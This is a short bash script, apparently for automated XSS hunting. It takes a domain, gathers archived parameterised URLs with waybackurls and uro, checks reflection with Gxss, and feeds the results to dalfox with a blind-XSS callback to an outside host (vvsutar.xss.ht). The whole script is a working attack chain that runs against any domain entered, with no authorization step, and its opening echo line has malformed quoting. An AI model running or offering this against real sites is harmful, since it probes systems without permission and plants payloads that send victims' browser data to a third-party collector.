echo -e "\e[31m  "Enter the domain::: " \e[1m" 
"
read s


waybackurls $s | grep "=" | sort -u | uniq | tee -a urls.txt

cat urls.txt | uro | tee -a clean.txt

cat clean.txt | Gxss -p test | tee xss.txt  


rm -rf urls.txt clean.txt 

cat xss.txt | dalfox pipe --skip-mining-dict --delay 3 --silence -w 50 --skip-mining-all -b https://vvsutar.xss.ht

